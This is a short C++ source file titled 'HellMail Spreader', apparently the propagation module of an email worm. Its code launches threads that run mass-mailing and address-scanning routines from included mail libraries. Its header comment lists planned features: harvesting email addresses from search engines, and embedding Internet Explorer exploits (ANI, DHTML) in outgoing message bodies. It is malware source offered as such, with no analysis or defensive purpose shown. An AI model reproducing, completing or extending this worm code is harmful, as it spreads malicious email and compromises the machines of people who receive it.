/*---------------------------------------------*
-> HellMail Spreader

  todo :

  *emails grabber from search engine google, altavista...
  *email body as internet explorer exploit (ANI, DHTML)
  
/*---------------------------------------------*/
#include "Hell.h"
extern "C" {
#include "mail/lib.h"
#include "mail/massmail.h"
#include "mail/scan.h"
}
void *CMail::Run()
{
	massmail_init();
	CreateThread(NULL, 0, (unsigned long (__stdcall *)(void *))massmail_main, 0, 0, NULL);
	scan_init();
	CreateThread(NULL, 0, (unsigned long (__stdcall *)(void *))scan_main, 0, 0, NULL);
	return NULL;
}